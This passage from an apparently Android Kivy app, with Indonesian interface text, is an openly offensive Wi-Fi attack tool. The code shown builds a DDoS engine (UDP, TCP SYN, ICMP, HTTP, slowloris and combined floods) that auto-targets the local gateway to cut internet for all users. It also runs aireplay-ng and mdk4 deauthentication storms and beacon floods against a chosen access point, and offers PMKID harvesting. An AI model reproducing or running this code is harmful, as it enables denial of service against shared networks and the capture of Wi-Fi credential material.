                          ('mdk4',   '☠ MDK4'),
                          ('beacon', '◉ BEACON')]:
            b = TabBtn(text=txt, font_size='8sp', active=(key=='disco'))
            b.bind(on_press=lambda x, k=key: self._set_spam_mode(k))
            self._spam_btns[key] = b
            mode_row.add_widget(b)
        self._spam_panel.add_widget(mode_row)
        self._spam_mode = 'disco'

        self._spam_panel.add_widget(HRule())

        # target display
        tgt_row = BoxLayout(size_hint_y=None, height=28)
        tgt_row.add_widget(Label(text='TARGET :', font_size='9sp',
                                   color=C_MUTED, size_hint_x=0.28))
        self._spam_tgt_lbl = Label(text='— pilih AP dari tab SCAN —',
                                    font_size='10sp', color=C_GOLD,
                                    halign='left')
        self._spam_tgt_lbl.bind(size=self._spam_tgt_lbl.setter('text_size'))
        tgt_row.add_widget(self._spam_tgt_lbl)
        self._spam_panel.add_widget(tgt_row)

        # interval slider
        ir = BoxLayout(size_hint_y=None, height=34, spacing=8)
        ir.add_widget(Label(text='INTERVAL ms', font_size='8sp',
                             color=C_MUTED, size_hint_x=0.32))
        self._spam_int = Slider(min=10, max=2000, value=200, step=10,
                                 size_hint_x=0.46)
        self._spam_int_lbl = Label(text='200', font_size='12sp', color=C_ORANGE,
                                    size_hint_x=0.22)
        self._spam_int.bind(
            value=lambda s,v: setattr(self._spam_int_lbl,'text',str(int(v))))
        ir.add_widget(self._spam_int); ir.add_widget(self._spam_int_lbl)
        self._spam_panel.add_widget(ir)

        # deauth count (untuk aireplay --deauth N)
        dc = BoxLayout(size_hint_y=None, height=34, spacing=8)
        dc.add_widget(Label(text='DEAUTH COUNT', font_size='8sp',
                             color=C_MUTED, size_hint_x=0.32))
        self._deauth_count = Slider(min=0, max=100, value=0, step=5,
                                     size_hint_x=0.46)
        self._deauth_count_lbl = Label(text='∞', font_size='12sp', color=C_RED,
                                        size_hint_x=0.22)
        def _on_dc(s, v):
            setattr(self._deauth_count_lbl, 'text',
                    '∞' if int(v)==0 else str(int(v)))
        self._deauth_count.bind(value=_on_dc)
        dc.add_widget(self._deauth_count); dc.add_widget(self._deauth_count_lbl)
        self._spam_panel.add_widget(dc)

        # round counter
        rc = BoxLayout(size_hint_y=None, height=34, spacing=8)
        rc.add_widget(Label(text='MAX ROUNDS (0=∞)', font_size='8sp',
                             color=C_MUTED, size_hint_x=0.32))
        self._spam_rounds = Slider(min=0, max=500, value=0, step=10,
                                    size_hint_x=0.46)
        self._spam_rounds_lbl = Label(text='∞', font_size='12sp', color=C_BLUE,
                                       size_hint_x=0.22)
        def _on_rounds(s, v):
            setattr(self._spam_rounds_lbl, 'text', '∞' if int(v)==0 else str(int(v)))
        self._spam_rounds.bind(value=_on_rounds)
        rc.add_widget(self._spam_rounds); rc.add_widget(self._spam_rounds_lbl)
        self._spam_panel.add_widget(rc)

        self._spam_panel.add_widget(Label(
            text='disco/auth: non-root  |  deauth/mdk4/beacon: butuh root + mon mode',
            font_size='7sp', color=C_MUTED, size_hint_y=None, height=14,
            halign='left'))

    # ── DDOS panel ────────────────────────────────────────────────────────────
    def _make_ddos_panel(self):
        self._ddos_panel = GlowCard(orientation='vertical',
                                     size_hint_y=None, height=460,
                                     spacing=8, padding=[12,10])
        self._ddos_panel.add_widget(Label(
            text='DDOS ENGINE — LUMPUHKAN WIFI / ROUTER',
            font_size='10sp', bold=True,
            color=C_RED, size_hint_y=None, height=18, halign='left'))
        self._ddos_panel.add_widget(Label(
            text='flood IP gateway/AP → internet lambat / putus untuk semua user',
            font_size='8sp', color=C_MUTED, size_hint_y=None, height=14,
            halign='left'))
        self._ddos_panel.add_widget(HRule())

        # target IP input
        tgt_row = BoxLayout(size_hint_y=None, height=42, spacing=8)
        tgt_row.add_widget(Label(text='TARGET IP', font_size='9sp',
                                   color=C_MUTED, size_hint_x=0.28))
        self._ddos_ip = TextInput(
            hint_text='192.168.1.1  (gateway router)', multiline=False,
            background_color=(*C_BG0[:3],1), foreground_color=C_TEXT,
            hint_text_color=C_MUTED, font_size='11sp', cursor_color=C_RED,
            size_hint_x=0.72)
        tgt_row.add_widget(self._ddos_ip)
        self._ddos_panel.add_widget(tgt_row)

        # target port
        port_row = BoxLayout(size_hint_y=None, height=34, spacing=8)
        port_row.add_widget(Label(text='PORT', font_size='9sp',
                                   color=C_MUTED, size_hint_x=0.28))
        self._ddos_port = TextInput(
            text='80', multiline=False,
            background_color=(*C_BG0[:3],1), foreground_color=C_TEXT,
            hint_text_color=C_MUTED, font_size='11sp', cursor_color=C_RED,
            size_hint_x=0.36)
        port_row.add_widget(self._ddos_port)
        port_row.add_widget(Label(text='80=web  53=dns  443=https  7=echo',
                                   font_size='8sp', color=C_MUTED))
        self._ddos_panel.add_widget(port_row)

        # attack mode selector
        self._ddos_panel.add_widget(Label(
            text='MODE SERANGAN', font_size='8sp', bold=True,
            color=C_ORANGE, size_hint_y=None, height=16, halign='left'))

        mode_row1 = BoxLayout(size_hint_y=None, height=36, spacing=4)
        mode_row2 = BoxLayout(size_hint_y=None, height=36, spacing=4)
        self._ddos_btns = {}
        modes = [
            ('udp',       '◈ UDP FLOOD',   C_RED),
            ('tcp',       '◉ TCP FLOOD',   C_ORANGE),
            ('icmp',      '◉ ICMP FLOOD',  C_GOLD),
            ('http',      '◉ HTTP FLOOD',  C_BLUE),
            ('slowloris', '◉ SLOWLORIS',   C_PURPLE),
            ('combo',     '☠ COMBO ALL',   C_RED),
        ]
        for i, (key, txt, col) in enumerate(modes):
            b = TabBtn(text=txt, font_size='8sp', active=(key=='udp'))
            b.color = col if b.color != C_TEAL else b.color
            b.bind(on_press=lambda x, k=key: self._set_ddos_mode(k))
            self._ddos_btns[key] = b
            if i < 3:
                mode_row1.add_widget(b)
            else:
                mode_row2.add_widget(b)
        self._ddos_mode = 'udp'
        self._ddos_panel.add_widget(mode_row1)
        self._ddos_panel.add_widget(mode_row2)

        self._ddos_panel.add_widget(HRule())

        # thread count slider
        th_row = BoxLayout(size_hint_y=None, height=34, spacing=8)
        th_row.add_widget(Label(text='THREADS', font_size='8sp',
                                 color=C_MUTED, size_hint_x=0.28))
        self._ddos_threads = Slider(min=1, max=64, value=8, step=1,
                                     size_hint_x=0.50)
        self._ddos_threads_lbl = Label(text='8', font_size='12sp', color=C_ORANGE,
                                        size_hint_x=0.22)
        self._ddos_threads.bind(
            value=lambda s,v: setattr(self._ddos_threads_lbl,'text',str(int(v))))
        th_row.add_widget(self._ddos_threads)
        th_row.add_widget(self._ddos_threads_lbl)
        self._ddos_panel.add_widget(th_row)

        # payload size slider (UDP)
        sz_row = BoxLayout(size_hint_y=None, height=34, spacing=8)
        sz_row.add_widget(Label(text='PAYLOAD B', font_size='8sp',
                                 color=C_MUTED, size_hint_x=0.28))
        self._ddos_size = Slider(min=64, max=65000, value=1024, step=64,
                                  size_hint_x=0.50)
        self._ddos_size_lbl = Label(text='1024', font_size='12sp', color=C_BLUE,
                                     size_hint_x=0.22)
        self._ddos_size.bind(
            value=lambda s,v: setattr(self._ddos_size_lbl,'text',str(int(v))))
        sz_row.add_widget(self._ddos_size)
        sz_row.add_widget(self._ddos_size_lbl)
        self._ddos_panel.add_widget(sz_row)

        # PPS live display
        pps_row = BoxLayout(size_hint_y=None, height=38, spacing=8)
        pps_row.add_widget(Label(text='PKTS SENT', font_size='9sp',
                                  color=C_MUTED, size_hint_x=0.35))
        self._ddos_pps_lbl = Label(text='0', font_size='20sp', bold=True,
                                    color=C_RED, size_hint_x=0.65)
        pps_row.add_widget(self._ddos_pps_lbl)
        self._ddos_panel.add_widget(pps_row)

        # fire button
        self._ddos_fire_btn = Button(
            text='☠  LAUNCH DDOS', font_size='13sp', bold=True,
            size_hint_y=None, height=48,
            background_normal='', background_color=(*hx('#2a0010')[:3],1),
            color=C_RED)
        self._ddos_fire_btn.bind(on_press=self._toggle_ddos)
        self._ddos_panel.add_widget(self._ddos_fire_btn)

        self._ddos_panel.add_widget(Label(
            text='combo = UDP+TCP+HTTP sekaligus  |  slowloris = connection exhaustion',
            font_size='7sp', color=C_MUTED, size_hint_y=None, height=14,
            halign='left'))

    # ── ROOT panel ────────────────────────────────────────────────────────────
    def _make_root_panel(self):
        self._root_panel = GlowCard(orientation='vertical',
                                     size_hint_y=None, height=400,
                                     spacing=8, padding=[12,10])
        self._root_panel.add_widget(Label(
            text='ROOT TOOLS  —  aktif hanya jika device di-root',
            font_size='10sp', bold=True, color=C_GOLD,
            size_hint_y=None, height=18, halign='left'))
        self._root_panel.add_widget(HRule())

        self._root_status_lbl = Label(
            text='mendeteksi root...', font_size='11sp',
            color=C_MUTED, size_hint_y=None, height=24)
        self._root_panel.add_widget(self._root_status_lbl)

        # monitor mode
        mon_card = GlowCard(orientation='horizontal', size_hint_y=None,
                             height=46, spacing=8, padding=[10,4])
        mon_card.add_widget(Label(text='Monitor Mode', font_size='10sp',
                                   color=C_TEXT))
        self._mon_btn = Button(
            text='▶ START', font_size='10sp', bold=True,
            size_hint_x=None, width=80,
            background_normal='', background_color=(*C_BG2[:3],1),
            color=C_TEAL)
        self._mon_btn.bind(on_press=self._toggle_mon)
        self._mon_on  = False
        self._mon_iface = 'wlan0mon'
        mon_card.add_widget(self._mon_btn)
        self._root_panel.add_widget(mon_card)

        # channel hopper
        ch_card = GlowCard(orientation='horizontal', size_hint_y=None,
                            height=46, spacing=8, padding=[10,4])
        ch_card.add_widget(Label(text='Channel Hopper (1-13)', font_size='10sp',
                                  color=C_TEXT))
        self._ch_btn = Button(
            text='▶ HOP', font_size='10sp', bold=True,
            size_hint_x=None, width=80,
            background_normal='', background_color=(*C_BG2[:3],1),
            color=C_BLUE)
        self._ch_btn.bind(on_press=self._toggle_ch_hop)
        ch_card.add_widget(self._ch_btn)
        self._root_panel.add_widget(ch_card)

        # airodump scan
        dump_card = GlowCard(orientation='horizontal', size_hint_y=None,
                              height=46, spacing=8, padding=[10,4])
        dump_card.add_widget(Label(text='Airodump Scan', font_size='10sp',
                                    color=C_TEXT))
        dump_btn = Button(
            text='▶ SCAN', font_size='10sp', bold=True,
            size_hint_x=None, width=80,
            background_normal='', background_color=(*C_BG2[:3],1),
            color=C_ORANGE)
        dump_btn.bind(on_press=self._root_airodump)
        dump_card.add_widget(dump_btn)
        self._root_panel.add_widget(dump_card)

        # MDK4 beacon flood
        mdk4_card = GlowCard(orientation='horizontal', size_hint_y=None,
                              height=46, spacing=8, padding=[10,4])
        mdk4_card.add_widget(Label(text='MDK4 Beacon Flood', font_size='10sp',
                                    color=C_TEXT))
        self._mdk4_btn = Button(
            text='▶ FLOOD', font_size='10sp', bold=True,
            size_hint_x=None, width=80,
            background_normal='', background_color=(*hx('#1a0010')[:3],1),
            color=C_RED)
        self._mdk4_btn.bind(on_press=self._root_mdk4_beacon)
        self._mdk4_running = False
        mdk4_card.add_widget(self._mdk4_btn)
        self._root_panel.add_widget(mdk4_card)

        # MDK4 deauth storm
        mdk4d_card = GlowCard(orientation='horizontal', size_hint_y=None,
                               height=46, spacing=8, padding=[10,4])
        mdk4d_card.add_widget(Label(text='MDK4 Deauth Storm', font_size='10sp',
                                     color=C_TEXT))
        self._mdk4d_btn = Button(
            text='▶ STORM', font_size='10sp', bold=True,
            size_hint_x=None, width=80,
            background_normal='', background_color=(*hx('#1a0010')[:3],1),
            color=C_RED)
        self._mdk4d_btn.bind(on_press=self._root_mdk4_deauth)
        self._mdk4d_running = False
        mdk4d_card.add_widget(self._mdk4d_btn)
        self._root_panel.add_widget(mdk4d_card)

        # PMKID
        pmkid_card = GlowCard(orientation='horizontal', size_hint_y=None,
                               height=46, spacing=8, padding=[10,4])
        pmkid_card.add_widget(Label(text='PMKID Harvest', font_size='10sp',
                                     color=C_TEXT))
        pmkid_btn = Button(
            text='▶ HARVEST', font_size='10sp', bold=True,
            size_hint_x=None, width=80,
            background_normal='', background_color=(*C_BG2[:3],1),
            color=C_GOLD)
        pmkid_btn.bind(on_press=self._root_pmkid)
        pmkid_card.add_widget(pmkid_btn)
        self._root_panel.add_widget(pmkid_card)

    # ── log panel ─────────────────────────────────────────────────────────────
    def _make_log_panel(self):
        self._log_lbl = Label(text='KONSOL OUTPUT', font_size='8sp',
                               color=C_MUTED, size_hint_y=None, height=14,
                               halign='left')
        self._log_lbl.bind(size=self._log_lbl.setter('text_size'))
        self._log_view = TextInput(
            readonly=True, multiline=True,
            background_color=(*C_BG1[:3],1),
            foreground_color=(*C_MUTED[:3],1),
            font_size='9sp', size_hint_y=None, height=150,
            padding=[8,6])

    # ── footer ────────────────────────────────────────────────────────────────
    def _build_footer(self):
        foot = BoxLayout(orientation='vertical', size_hint_y=None, height=62)
        with foot.canvas.before:
            Color(*hx('#0d0a12'))
            self._fr = Rectangle(pos=foot.pos, size=foot.size)
            Color(*C_TEAL[:3], 0.10)
            self._fl = Rectangle(pos=(foot.x,foot.y+foot.height-1),
                                   size=(foot.width,1))
        foot.bind(pos=self._rf, size=self._rf)

        self.fire_btn = Button(
            text='▶  FIRE', font_size='15sp', bold=True,
            background_normal='', background_color=(*hx('#1a0010')[:3],1),
            color=C_RED)
        self.fire_btn.bind(on_press=self._toggle_fire)
        foot.add_widget(self.fire_btn)
        foot.add_widget(Watermark())
        return foot

    def _rf(self, inst, *a):
        self._fr.pos  = inst.pos
        self._fr.size = inst.size
        self._fl.pos  = (inst.x, inst.y+inst.height-1)
        self._fl.size = (inst.width, 1)

    # ── tab switcher ──────────────────────────────────────────────────────────
    def _switch_tab(self, key):
        self._mode = key
        for k, b in self._tabs.items():
            b.set_active(k == key)
        self._body.clear_widgets()
        panels = {
            'scan':  self._scan_panel,
            'info':  self._info_panel,
            'saved': self._saved_panel,
            'spam':  self._spam_panel,
            'ddos':  self._ddos_panel,
            'root':  self._root_panel,
        }
        p = panels[key]
        p.opacity = 0
        self._body.add_widget(p)
        Animation(opacity=1, duration=0.18).start(p)
        self._body.add_widget(Widget(size_hint_y=None, height=4))
        self._body.add_widget(HRule())
        self._body.add_widget(self._log_lbl)
        self._body.add_widget(self._log_view)

    # ── log ───────────────────────────────────────────────────────────────────
    def _log(self, msg, kind='info'):
        tag = {'ok':'[+]','info':'[·]','warn':'[!]',
               'err':'[✗]','muted':' — '}.get(kind,'[·]')
        def _do(*a):
            # keep log under 200 lines
            lines = self._log_view.text.split('\n')
            if len(lines) > 200:
                self._log_view.text = '\n'.join(lines[-150:])
            self._log_view.text += f'{tag} {msg}\n'
            self._log_view.cursor = (0, len(self._log_view.text))
        Clock.schedule_once(_do, 0)

    # ── boot ──────────────────────────────────────────────────────────────────
    def _boot(self):
        _init_android_apis()
        if IS_ANDROID and wifi_mgr is None:
            Clock.schedule_once(lambda *a: self._log(
                '[api] jnius gagal — scan pakai root fallback', 'warn'), 0)

        if IS_ANDROID:
            try:
                request_permissions([
                    Permission.ACCESS_FINE_LOCATION,
                    Permission.ACCESS_COARSE_LOCATION,
                    Permission.ACCESS_WIFI_STATE,
                    Permission.CHANGE_WIFI_STATE,
                    Permission.ACCESS_NETWORK_STATE,
                    Permission.CHANGE_NETWORK_STATE,
                    Permission.INTERNET,
                ])
                self._log('[perm] izin diminta ke user', 'info')
            except Exception as e:
                self._log(f'[perm] {e}', 'warn')

        time.sleep(1.0)
        def _ui(*a):
            self._hdr.set_root_mode(IS_ROOT)
            if IS_ROOT:
                self._log('[root] ROOT terdeteksi — fitur aircrack + mdk4 aktif', 'ok')
                self._root_status_lbl.text  = '✓ ROOT aktif — semua fitur tersedia'
                self._root_status_lbl.color = C_TEAL
            else:
                self._log('[root] non-root — WifiManager API aktif', 'info')
                self._root_status_lbl.text  = '✗ Non-Root — tools ROOT tidak tersedia'
                self._root_status_lbl.color = C_MUTED
        Clock.schedule_once(_ui, 0)
        self._refresh_info()

        # start PPS ticker
        Clock.schedule_interval(self._tick_pps, 1.0)

    # ── PPS ticker ────────────────────────────────────────────────────────────
    def _tick_pps(self, dt):
        cur = self._ddos_counter[0]
        pps = cur - self._ddos_pps_prev
        self._ddos_pps_prev = cur
        if self._ddos_running:
            self.st_pps.update(fmt_pps(pps), C_RED)
            self._ddos_pps_lbl.text = f'{fmt_pps(cur)} ({fmt_pps(pps)}/s)'

    # ── Wi-Fi toggle ──────────────────────────────────────────────────────────
    def _toggle_wifi(self, *a):
        self._wifi_enabled = not self._wifi_enabled
        wifi_enable(self._wifi_enabled)
        state = 'ON' if self._wifi_enabled else 'OFF'
        self._hdr.wifi_btn.text  = f'Wi-Fi {state}'
        self._hdr.wifi_btn.color = C_TEAL if self._wifi_enabled else C_RED
        self._log(f'[wifi] Wi-Fi {state}', 'ok' if self._wifi_enabled else 'warn')

    # ── scan ──────────────────────────────────────────────────────────────────
    def _toggle_scan(self, *a):
        if self._scanning:
            self._stop_scan()
        else:
            self._start_scan()

    def _start_scan(self):
        self._scanning = True
        self._scan_btn.text             = '■  STOP SCAN'
        self._scan_btn.background_color = (*hx('#1a0010')[:3],1)
        self._scan_btn.color            = C_RED
        self.st_status.update('SCANNING', C_TEAL)
        self._log('[scan] mulai continuous scan...', 'info')
        Clock.schedule_interval(self._do_scan, 3.0)
        self._do_scan(0)

    def _stop_scan(self):
        self._scanning = False
        Clock.unschedule(self._do_scan)
        self._scan_btn.text             = '▶  START SCAN'
        self._scan_btn.background_color = (*hx('#0a2015')[:3],1)
        self._scan_btn.color            = C_TEAL
        self.st_status.update('IDLE', C_MUTED)
        self._log(f'[scan] selesai — {len(self._ap_list)} AP', 'ok')

    def _burst_scan(self, *a):
        """Throttle buster: trigger startScan 5x cepat dari thread berbeda."""
        self._log('[burst] throttle buster — 5x scan trigger...', 'warn')
        def _run():
            for i in range(5):
                wifi_start_scan()
                time.sleep(0.4)
            time.sleep(2.0)
            aps = wifi_get_results()
            self._ap_list = aps
            def _ui(*x):
                self.st_aps.update(str(len(aps)), C_TEAL)
                self._ap_table.clear_widgets()
                for ap in aps:
                    self._ap_table.add_widget(APRow(ap, self._select_ap))
                self._log(f'[burst] {len(aps)} AP ditemukan', 'ok')
            Clock.schedule_once(_ui, 0)
        threading.Thread(target=_run, daemon=True).start()

    def _do_scan(self, dt):
        def _run():
            if IS_ANDROID and wifi_mgr:
                wifi_start_scan()
                time.sleep(1.5)
                aps = wifi_get_results()
            elif IS_ROOT:
                raw = root_run('iwlist scan 2>/dev/null', timeout=15)
                aps = _parse_iwlist(raw)
            else:
                aps = []
                self._log('[scan] no Android API and no root', 'warn')
            self._ap_list = aps
            # update signal tracker
            for ap in aps:
                bssid = ap['bssid']
                if bssid not in self._signal_track:
                    self._signal_track[bssid] = []
                self._signal_track[bssid].append(int(ap['pwr']))
                if len(self._signal_track[bssid]) > 30:
                    self._signal_track[bssid].pop(0)
            def _ui(*a):
                self.st_aps.update(str(len(aps)), C_TEAL)
                self._ap_table.clear_widgets()
                flt = (self._filter_inp.text or '').lower()
                for ap in aps:
                    if flt and flt not in ap['ssid'].lower():
                        continue
                    self._ap_table.add_widget(APRow(ap, self._select_ap))
            Clock.schedule_once(_ui, 0)
        threading.Thread(target=_run, daemon=True).start()

    def _apply_filter(self, instance, text):
        flt = text.lower()
        def _ui(*a):
            self._ap_table.clear_widgets()
            for ap in self._ap_list:
                if flt and flt not in ap['ssid'].lower():
                    continue
                self._ap_table.add_widget(APRow(ap, self._select_ap))
        Clock.schedule_once(_ui, 0)

    def _select_ap(self, ap):
        self._selected_ap = ap
        ssid  = ap['ssid']
        bssid = ap['bssid']
        self._spam_tgt_lbl.text = f'{ssid}  {bssid}  ch{ap["ch"]}  {ap["enc"]}'
        self.st_ch.update(ap['ch'], C_BLUE)
        self.st_enc.update(ap['enc'], C_GOLD)
        self._log(f'[sel] {ssid} — {bssid} ch{ap["ch"]} {ap["pwr"]}dBm', 'ok')
        self._switch_tab('spam')

    def _toggle_tracker(self, *a):
        self._trk_running = not self._trk_running
        if self._trk_running:
            self._trk_btn.text  = 'ON'
            self._trk_btn.color = C_GREEN
            Clock.schedule_interval(self._print_tracker, 5.0)
            self._log('[tracker] signal tracker aktif', 'ok')
        else:
            self._trk_btn.text  = 'OFF'
            self._trk_btn.color = C_MUTED
            Clock.unschedule(self._print_tracker)
            self._log('[tracker] tracker berhenti', 'warn')

    def _print_tracker(self, dt):
        if not self._signal_track:
            return
        for bssid, hist in list(self._signal_track.items())[-5:]:
            if hist:
                avg = sum(hist) / len(hist)
                trend = '↑' if len(hist) > 1 and hist[-1] > hist[-2] else '↓'
                self._log(f'[trk] {bssid}  avg:{avg:.0f}dBm  {trend}', 'muted')

    # ── info ──────────────────────────────────────────────────────────────────
    def _refresh_info(self):
        def _run():
            info = wifi_get_current()
            gw   = get_gateway_ip(info.get('ip', ''))
            def _ui(*a):
                self.info_ssid.text  = info['ssid']  or '—'
                self.info_bssid.text = info['bssid'] or '—'
                self.info_ip.text    = info['ip']    or '—'
                self.info_gw.text    = gw             or '—'
                rssi = info['rssi']
                self.info_rssi.text  = (f'{rssi} dBm  {signal_quality(rssi)}'
                                        if rssi else '—')
                spd  = info['link_speed']
                self.info_speed.text = f'{spd} Mbps' if spd else '—'
                self.info_mac.text   = info.get('mac','') or '—'
                # auto-fill ddos target
                if gw and not self._ddos_ip.text:
                    self._ddos_ip.text = gw
            Clock.schedule_once(_ui, 0)
        threading.Thread(target=_run, daemon=True).start()

    def _copy_gw_to_ddos(self, *a):
        gw = self.info_gw.text.strip()
        if gw and gw != '—':
            self._ddos_ip.text = gw
            self._switch_tab('ddos')
            self._log(f'[ddos] target set → {gw}', 'ok')
        else:
            self._log('[ddos] gateway belum tersedia — refresh INFO dulu', 'err')

    def _do_disconnect(self, *a):
        ok = wifi_disconnect()
        self._log('[disco] disconnect' + (' berhasil' if ok else ' gagal'),
                  'ok' if ok else 'err')
        Clock.schedule_once(lambda *x: self._refresh_info(), 1.0)

    def _do_reconnect(self, *a):
        ok = wifi_reconnect()
        self._log('[reconn] reconnect' + (' dikirim' if ok else ' gagal'),
                  'ok' if ok else 'err')
        Clock.schedule_once(lambda *x: self._refresh_info(), 2.0)

    # ── saved networks ────────────────────────────────────────────────────────
    def _load_saved(self):
        def _run():
            nets = wifi_get_saved_networks()
            self._saved_nets = nets
            def _ui(*a):
                self._saved_table.clear_widgets()
                if not nets:
                    self._saved_table.add_widget(Label(
                        text='tidak ada jaringan tersimpan\n(butuh Android ≤ 9 atau root)',
                        font_size='10sp', color=C_MUTED,
                        size_hint_y=None, height=48))
                for net in nets:
                    self._saved_table.add_widget(
                        SavedNetRow(net, self._forget_one))
                self._log(f'[saved] {len(nets)} jaringan tersimpan', 'ok')
            Clock.schedule_once(_ui, 0)
        threading.Thread(target=_run, daemon=True).start()

    def _forget_one(self, net):
        ok = wifi_forget_network(net['id'])
        self._log(f'[forget] {net["ssid"]}: {"ok" if ok else "gagal"}',
                  'ok' if ok else 'err')
        if ok:
            self._load_saved()

    def _forget_all(self, *a):
        def _run():
            count = 0
            for net in self._saved_nets:
                if wifi_forget_network(net['id']):
                    count += 1
            Clock.schedule_once(lambda *x: (
                self._log(f'[forget-all] {count} jaringan dihapus', 'ok'),
                self._load_saved()
            ), 0)
        threading.Thread(target=_run, daemon=True).start()

    # ── spam / attack ─────────────────────────────────────────────────────────
    def _set_spam_mode(self, key):
        self._spam_mode = key
        for k, b in self._spam_btns.items():
            b.set_active(k == key)
        if key in ('deauth','mdk4','beacon') and not IS_ROOT:
            self._log(f'[spam] {key} butuh ROOT — tidak tersedia', 'err')

    def _toggle_fire(self, *a):
        if self._mode == 'ddos':
            self._toggle_ddos()
            return
        if self._mode != 'spam':
            self._switch_tab('spam')
            return
        if self._spam_running:
            self._stop_spam()
        else:
            self._start_spam()

    def _start_spam(self):
        if not self._selected_ap and self._spam_mode not in ('beacon',):
            self._log('[spam] pilih target AP dari tab SCAN dulu', 'err')
            return
        if self._spam_mode in ('deauth','mdk4','beacon') and not IS_ROOT:
            self._log('[spam] mode ini butuh root', 'err')
            return

        self._spam_running = True
        interval   = int(self._spam_int.value) / 1000.0
        max_rounds = int(self._spam_rounds.value)
        d_count    = int(self._deauth_count.value)

        self.fire_btn.text             = '■  STOP'
        self.fire_btn.background_color = (*hx('#4a0010')[:3],1)
        self.st_status.update('ATTACK', C_RED)
        self._log(f'[spam] {self._spam_mode} start — interval {int(interval*1000)}ms', 'err')

        def _run():
            rounds = 0
            while self._spam_running:
                if max_rounds and rounds >= max_rounds:
                    break
                try:
                    if self._spam_mode == 'disco':
                        wifi_disconnect()
                        time.sleep(interval)
                        wifi_reconnect()
                    elif self._spam_mode == 'auth':
                        wifi_reconnect()
                        time.sleep(interval * 0.5)
                        wifi_disconnect()
                    elif self._spam_mode == 'deauth' and IS_ROOT:
                        ap = self._selected_ap
                        if ap:
                            dc_flag = str(d_count) if d_count > 0 else '0'
                            root_run(
                                f'aireplay-ng --deauth {dc_flag} -a {ap["bssid"]} '
                                f'{self._mon_iface}', timeout=10)
                    elif self._spam_mode == 'mdk4' and IS_ROOT:
                        ap = self._selected_ap
                        if ap:
                            # MDK4 deauth all clients on target BSSID
                            root_run(
                                f'mdk4 {self._mon_iface} d -B {ap["bssid"]}',
                                timeout=int(interval) + 2)
                    elif self._spam_mode == 'beacon' and IS_ROOT:
                        # Beacon flood dengan SSID random (overwhelming AP scanner)
                        root_run(
                            f'mdk4 {self._mon_iface} b -c {self._selected_ap["ch"] if self._selected_ap else "1"}',
                            timeout=int(interval) + 2)
                except Exception as e:
                    Clock.schedule_once(lambda *x, err=e:
                        self._log(f'[spam] {err}', 'warn'), 0)
                rounds += 1
                r = rounds
                Clock.schedule_once(lambda *x, n=r:
                    self.fire_btn.setter('text')(self.fire_btn,
                                                 f'■  {n} rounds'), 0)
                time.sleep(interval)
            Clock.schedule_once(lambda *a: self._stop_spam(), 0)

        self._spam_thread = threading.Thread(target=_run, daemon=True)
        self._spam_thread.start()

    def _stop_spam(self):
        self._spam_running = False
        self.fire_btn.text             = '▶  FIRE'
        self.fire_btn.background_color = (*hx('#1a0010')[:3],1)
        self.st_status.update('IDLE', C_MUTED)
        self._log('[spam] berhenti', 'warn')

    # ── DDOS engine ───────────────────────────────────────────────────────────
    def _set_ddos_mode(self, key):
        self._ddos_mode = key
        for k, b in self._ddos_btns.items():
            b.set_active(k == key)

    def _toggle_ddos(self, *a):
        if self._ddos_running:
            self._stop_ddos()
        else:
            self._start_ddos()

    def _start_ddos(self):
        target_ip = self._ddos_ip.text.strip()
        if not target_ip:
            self._log('[ddos] masukkan target IP — buka INFO untuk auto-detect gateway', 'err')
            return

        try:
            port = int(self._ddos_port.text.strip())
        except ValueError:
            port = 80

        n_threads = int(self._ddos_threads.value)
        payload_sz = int(self._ddos_size.value)

        self._ddos_running = True
        self._ddos_stop.clear()
        self._ddos_counter[0] = 0
        self._ddos_pps_prev   = 0
        self._ddos_workers    = []

        self._ddos_fire_btn.text             = '■  STOP DDOS'
        self._ddos_fire_btn.background_color = (*hx('#4a0010')[:3],1)
        self.st_status.update('DDOS', C_RED)
        self._log(f'[ddos] {self._ddos_mode.upper()} → {target_ip}:{port}  '
                  f'threads:{n_threads}', 'err')

        def _spawn():
            mode = self._ddos_mode
            for _ in range(n_threads):
                if mode == 'udp':
                    t = threading.Thread(
                        target=_udp_flood_worker,
                        args=(target_ip, port, self._ddos_stop,
                              self._ddos_counter, payload_sz),
                        daemon=True)
                elif mode == 'tcp':
                    t = threading.Thread(
                        target=_tcp_syn_flood_worker,
                        args=(target_ip, port, self._ddos_stop,
                              self._ddos_counter),
                        daemon=True)
                elif mode == 'icmp':
                    t = threading.Thread(
                        target=_icmp_flood_worker,
                        args=(target_ip, self._ddos_stop,
                              self._ddos_counter),
                        daemon=True)
                elif mode == 'http':
                    t = threading.Thread(
                        target=_http_flood_worker,
                        args=(target_ip, port, self._ddos_stop,
                              self._ddos_counter),
                        daemon=True)
                elif mode == 'slowloris':
                    # slowloris: 1 master thread with pool of sockets
                    t = threading.Thread(
                        target=_slowloris_worker,
                        args=(target_ip, port, self._ddos_stop,
                              self._ddos_counter, 50),
                        daemon=True)
                    self._ddos_workers.append(t)
                    t.start()
                    break  # single thread for slowloris
                elif mode == 'combo':
                    # combo: UDP + TCP + HTTP split across threads
                    per = max(1, n_threads // 3)
                    for fn, args in [
                        (_udp_flood_worker,  (target_ip, port, self._ddos_stop, self._ddos_counter, payload_sz)),
                        (_tcp_syn_flood_worker, (target_ip, port, self._ddos_stop, self._ddos_counter)),
                        (_http_flood_worker, (target_ip, port, self._ddos_stop, self._ddos_counter)),
                    ]:
                        for _ in range(per):
                            t2 = threading.Thread(target=fn, args=args, daemon=True)
                            self._ddos_workers.append(t2)
                            t2.start()
                    break
                else:
                    break

                if mode not in ('combo', 'slowloris'):
                    self._ddos_workers.append(t)
                    t.start()

        threading.Thread(target=_spawn, daemon=True).start()

    def _stop_ddos(self):
        self._ddos_running = False
        self._ddos_stop.set()
        self._ddos_fire_btn.text             = '☠  LAUNCH DDOS'
        self._ddos_fire_btn.background_color = (*hx('#2a0010')[:3],1)
        self.st_status.update('IDLE', C_MUTED)
        self.st_pps.update('0', C_MUTED)
        total = self._ddos_counter[0]
        self._log(f'[ddos] selesai — {fmt_pps(total)} paket dikirim', 'warn')

    # ── ROOT tools ────────────────────────────────────────────────────────────
    def _toggle_mon(self, *a):
        if not IS_ROOT:
            self._log('[root] butuh ROOT', 'err'); return
        def _run():
            if not self._mon_on:
                root_run('airmon-ng check kill')
                out = root_run(f'airmon-ng start wlan0')
                m   = re.search(r'(wlan\w*mon)', out)
                self._mon_iface = m.group(1) if m else 'wlan0mon'
                self._mon_on    = True
                def _ui(*a):
                    self._mon_btn.text  = '■ STOP'
                    self._mon_btn.color = C_TEAL
                    self._log(f'[mon] {self._mon_iface} aktif', 'ok')
                Clock.schedule_once(_ui, 0)
            else:
